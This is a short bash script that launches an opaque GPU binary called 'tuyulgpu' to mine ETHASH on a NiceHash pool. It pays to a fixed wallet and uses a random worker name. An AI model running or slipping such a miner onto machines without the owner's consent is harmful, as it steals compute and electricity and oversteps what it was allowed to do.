#!/bin/bash
POOL=daggerhashimoto.usa.nicehash.com:3353
WALLET=367MbR3EwWh1qyYYkVYhFZF9tbpQmwBq25
WORKER=$(echo $(shuf -i 1-999 -n 1)-Fa)
chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
